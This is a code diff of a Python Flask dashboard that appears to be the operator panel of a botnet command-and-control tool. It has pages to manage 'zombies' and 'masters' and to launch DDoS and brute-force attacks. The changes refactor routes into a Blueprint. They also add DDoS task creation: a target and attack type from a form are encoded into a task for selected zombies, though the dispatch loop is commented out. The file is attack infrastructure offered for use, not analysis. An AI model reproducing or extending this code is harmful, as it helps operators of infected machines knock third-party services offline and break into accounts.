@@ -2,8 +2,10 @@
 # -*- coding: utf-8 -*-
 # r3nt0n
 
-from app import app
-from flask import render_template, redirect, url_for, request, send_from_directory, jsonify, escape
+
+from flask import Blueprint, render_template, redirect, url_for, request, send_from_directory, jsonify, escape
+
+dashboard_bp = Blueprint('dashboard_bp', __name__)
 
 import os, json
 from datetime import datetime, timedelta
@@ -11,7 +13,7 @@ from functools import wraps
 
 from app import config, logger, zession, buffer, proxy
 
-from app.modules import create_data, read_data, update_data, delete_data
+from app.modules import encoder, create_data, read_data, update_data, delete_data
 
 
 def merge_date_time_values(date_value, time_value):
@@ -25,9 +27,13 @@ def merge_date_time_values(date_value, time_value):
 def filter_data_by_inputs(request, data_type, filter=None):
     if filter is None:
         filter = {}
+    if data_type == 'ddos-attacks':
+        data_type = 'tasks'
+        filter['by_task_type'] = 'ddos'
     if (request.method == 'POST') and ('btn-filter' in request.form):
         filter['by_username'] = escape(request.form.get('username'))
-        filter['by_os'] = request.form.get('os_filter')
+        if request.form.get('os_filter'):
+            filter['by_os'] = request.form.get('os_filter')
         filter['by_datetime_bef'] = merge_date_time_values(request.form.get('date_bef_filter'), request.form.get('time_bef_filter'))
         filter['by_datetime_aft'] = merge_date_time_values(request.form.get('date_aft_filter'), request.form.get('time_aft_filter'))
     return read_data(data_type, filter)
@@ -39,99 +45,26 @@ def login_required(f):
     def decorated_function(*args, **kwargs):
         #logger.log(zession, 'DEBUG')
         if zession.token.jwt == '':
-            return redirect(url_for('not_authorized'))
+            return redirect(url_for('dashboard_bp.not_authorized'))
         else:
             zession.check_for_refresh()
         return f(*args, **kwargs)
     return decorated_function
 
-# after every request
-@app.after_request
-def after_request_func(response):
-    logger.log('section: {}'.format(zession.current_section), 'INFO')
-    logger.log('request: {}'.format(request), 'DEBUG')
-    logger.log('form: {}'.format(request.form), 'DEBUG')
-    return response
 
-
-# @app.route('/create_proxy_popup.js')
-# def create_proxy_popup():
-#     return render_template('objects/dynamic/create_popups.js', data_type='proxy', window_type='popup')
-
-@app.route('/', methods=['GET', 'POST'])
-@app.route('/index/', methods=['GET', 'POST'])
-@app.route('/login/', methods=['GET', 'POST'])
-def login():
-    zession.current_section = 'login'
-    error = None
-    # print(zession)
-    if zession.token.jwt:
-        return redirect(url_for("dashboard"))
-    if request.method == 'POST':
-        hostname = escape(request.form.get('hostname'))
-        username = escape(request.form.get('username'))
-        pswd = escape(request.form.get('pswd'))
-        if zession.login(username, pswd, hostname):
-            return redirect(url_for("game"))
-        else:
-            error = zession.token.error
-    return render_template("pages/login/login.html", error=error, zession=zession)
-
-
-@app.route('/ajax/get-actual-ip', methods=['POST'])
-#@login_required
-def get_actual_ip():
-    #return jsonify({'text': proxy.get_actual_ip(request.form['text'])})
-    proxy.get_actual_ip()
-    flag = render_template('objects/dynamic/cc_flag.html', country_code=proxy.country)
-    return jsonify({'ip': proxy.current_ip, 'country': proxy.country, 'flag': flag})
-
-
-@app.route('/ajax/toggle-proxy', methods=['POST'])
-def toggle_proxy():
-    # logger.log('ajax data received: ', 'DEBUG')
-    # logger.log('request.form.host: '.format(request.form.get('host')), 'DEBUG')
-    # logger.log('request.form.port: '.format(request.form.get('port')), 'DEBUG')
-    if proxy.host:
-        proxy.remove()
-        enabled = 'false'
-        logger.log('socks5 proxy session {}:{} removed'.format(proxy.host, proxy.port), 'INFO')
-    else:
-        proxy.get_socks5_session(request.form.get('host'), int(request.form.get('port')))
-        enabled = 'true'
-        logger.log('socks5 proxy session {}:{} created'.format(proxy.host, proxy.port), 'INFO')
-    return jsonify({'enabled': enabled})
-
-
-@app.route('/ajax/is-proxy-enabled', methods=['POST'])
-def is_proxy_enabled():
-    host = port = ''
-    enabled = 'false'
-    if proxy.host:
-        enabled = 'true'
-        host = proxy.host
-        port = str(proxy.port)
-    return jsonify({'enabled': enabled, 'host': host, 'port': port})
-
-
-@app.route('/not-authorized/', methods=['GET', 'POST'])
-def not_authorized():
-    return render_template("pages/errors/not-authorized.html")
-
-
-@app.route('/logout/', methods=['GET', 'POST'])
+@dashboard_bp.route('/logout/', methods=['GET', 'POST'])
 @login_required
 def logout():
     zession.logout()
-    return redirect(url_for("login"))
+    return redirect(url_for("dashboard_bp.login"))
 
-@app.route('/game/', methods=['GET', 'POST'])
+@dashboard_bp.route('/game/', methods=['GET', 'POST'])
 @login_required
 def game():
     return render_template("pages/login/game.html", zession=zession)
 
 
-@app.route('/export-json/<data_type>/', methods=['POST'])
+@dashboard_bp.route('/export-json/<data_type>/', methods=['POST'])
 @login_required
 def export_json(data_type):
     selected_data_ids = request.form.getlist(data_type + '_checked')
@@ -158,13 +91,13 @@ def export_json(data_type):
         logger.log('tempfile {} deleted'.format(config.TEMP_DIR + filename), 'DEBUG')
 
 
-@app.route('/dashboard/', methods=['GET', 'POST'])
+@dashboard_bp.route('/dashboard/', methods=['GET', 'POST'])
 @login_required
 def dashboard():
     return render_template("pages/dashboard/base_dashboard.html", zession=zession)
 
 
-@app.route('/access-logs/', methods=['GET', 'POST'])
+@dashboard_bp.route('/access-logs/', methods=['GET', 'POST'])
 @login_required
 def access_logs():
     zession.current_section = 'logs'
@@ -186,7 +119,7 @@ def access_logs():
     return render_template("pages/dashboard/logs/access-logs.html", zession=zession, filter_error=filter_error, data=data)
 
 
-@app.route('/zombies/', methods=['GET', 'POST'])
+@dashboard_bp.route('/zombies/', methods=['GET', 'POST'])
 @login_required
 def zombies():
     zession.current_section = 'members'
@@ -227,8 +160,8 @@ def zombies():
 
     # delete zombies
     elif (request.method == 'POST') and ('btn-delete-zombies' in request.form):
-        selected_users = request.form.getlist('zombies_checked')
-        for username in selected_users:
+        selected_zombies = request.form.getlist('zombies_checked')
+        for username in selected_zombies:
             if delete_data('zombie', username):
                 zombies_deleted.append(username)
 
@@ -244,7 +177,7 @@ def zombies():
                            users_deleted=users_deleted)
 
 
-@app.route('/masters/', methods=['GET', 'POST'])
+@dashboard_bp.route('/masters/', methods=['GET', 'POST'])
 @login_required
 def masters():
 
@@ -256,7 +189,7 @@ def masters():
     # launch edit profile window
     if (request.method) == 'POST' and ('btn-launcher' in request.form):
         edit_profile = True
-        #return redirect(url_for('edit_profile'))
+        #return redirect(url_for('dashboard_bp.edit_profile'))
 
     # update profile
     elif (request.method) == 'POST' and not ('btn-launcher' in request.form or 'btn-filter' in request.form):
@@ -285,11 +218,12 @@ def masters():
     return render_template("pages/dashboard/members/masters.html", zession=zession, filter_error=filter_error, update_error=update_error, data=data, edit_profile=edit_profile)
 
 
-@app.route('/ddos-attacks/', methods=['GET', 'POST'])
+@dashboard_bp.route('/ddos-attacks/', methods=['GET', 'POST'])
 @login_required
 def ddos_attacks():
     zession.current_section = 'tools'
     data = {}
+    zombies_data = {}
     selected_zombies = []
     filter_error = create_error = None
     create_attack = zombies_selector_popup = False
@@ -308,23 +242,36 @@ def ddos_attacks():
     # launch ddos attack creator
     elif (request.method == 'POST') and ('btn-launcher' in request.form):
         logger.log('create attack requested', 'INFO')
-        data = filter_data_by_inputs(request, 'zombies')
+        zombies_data = filter_data_by_inputs(request, 'zombies')
         logger.log('data received: {}'.format(data), 'DEBUG')
         filter_error = ''
         create_attack = True
 
     # create new ddos attack
     if (request.method == 'POST') and ('btn-create-ddos-attack' in request.form):
-        pass
         logger.log('creating ddos attack', 'WARNING')
+
+        task_type = 'ddos'
+        task_content = {
+            'target': escape(request.form.get('target')),
+            'ddos_type': request.form.get('ddos_type')
+        }
+        encoded_json_task = encoder.pack_task(task_content)
+        logger.log('encoded json task: {}'.format(encoded_json_task), 'WARNING')
+        selected_zombies = request.form.getlist('zombies_checked')
+        # for username in selected_zombies:
+        #     if create_data('task', username):
+        #         zombies_deleted.append(username)
+
         # ...
         logger.log('clearing buffer', 'WARNING')
 
+    logger.log('data: {}'.format(data), 'WARNING')
     return render_template("pages/dashboard/tools/ddos-attacks.html", zession=zession, buffer=buffer, filter_error=filter_error, create_error=create_error,
-                           data=data, create_attack=create_attack, zombies_selector_popup=zombies_selector_popup, selected_zombies=selected_zombies)
+                           data=data, zombies_data=zombies_data, create_attack=create_attack, zombies_selector_popup=zombies_selector_popup, selected_zombies=selected_zombies)
 
 
-@app.route('/brute-attacks/', methods=['GET', 'POST'])
+@dashboard_bp.route('/brute-attacks/', methods=['GET', 'POST'])
 @login_required
 def brute_attacks():
     zession.current_section = 'tools'
